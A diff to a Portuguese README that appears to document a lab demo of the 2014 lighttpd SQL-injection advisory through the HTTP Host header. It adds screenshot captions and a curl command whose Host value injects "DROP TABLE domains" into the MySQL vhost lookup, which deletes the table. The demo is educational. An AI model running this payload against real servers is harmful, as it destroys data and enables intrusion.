@@ -30,7 +30,6 @@ Confirm: [http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt
 <!-- START doctoc generated TOC please keep comment here to allow auto update -->
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 
-**Tabela de Conteúdo**
 
 - [lighttpd (lighty)](#lighttpd-lighty)
 - [Virtual Hosting](#virtual-hosting)
@@ -41,7 +40,6 @@ Confirm: [http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt
   - [Container Networking](#container-networking)
 - [Demo!](#demo)
   - [Exploit](#exploit)
-  - [Obtendo os IPs](#obtendo-os-ips)
   - [Verificação do Path](#verifica%C3%A7%C3%A3o-do-path)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
@@ -301,9 +299,17 @@ Um request bem intencionado apresenta então o seguinte fluxo de pacotes ao "far
 
 Analisando os componentes:
 
+
+**Requisição bem formada HTTP**
 ![Requisição HTTP Ok](assets/HTTP-request-ok.png)
+
+**Requisição bem formada MySQL**
 ![Requisição MySQL Ok](assets/MySQL-request-ok.png)
+
+**Resposta MySQL**
 ![Resposta MySQL Ok](assets/MySQL-response-ok.png)
+
+**Resposta HTTP**
 ![Resposta HTTP Ok](assets/HTTP-response-ok.png)
 
 Podemos então explorar tal vulnerabilidade.
@@ -325,16 +331,30 @@ $ curl --header "Host: []' SINTAXE ERRADA" www.google.com
 
 Confirmamos que podemos explorar o banco de dados ao analisar o request feito ao banco:
 
-![Erro de Servidor](assets/mysql-syntax-error.png)
+**Requisição MySQL mal formada**
+![Requisição MySQL mal formada](assets/mysql-syntax-error.png)
+
+**Reposta MySQL**
+![Resposta requisição MySQL mal formada](assets/mysql-syntax-error-response.png)
 
 
-TODO
-
-### Obtendo os IPs
+Podemos prosseguir então com comandos!
 
 ```sh
-$ docker ps | grep 'lighty' | awk '{print $1}'
+$ curl --header "Host: []'; DROP TABLE domains;--'" redes.io
 ```
+
+**Requisição HTTP maliciosa**
+![Requisição HTTP maliciosa](assets/sql-injection-HTTP-request.png)
+
+**Requisição MySQL maliciosa**
+![Requisição MySQL maliciosa](assets/sql-injection-MySQL-request.png)
+
+**Reposta MySQL**
+![Resposta requisição MySQL maliciosa](assets/sql-injection-MySQL-response.png)
+
+E a tabela se foi!
+
 
 ### Verificação do Path
 
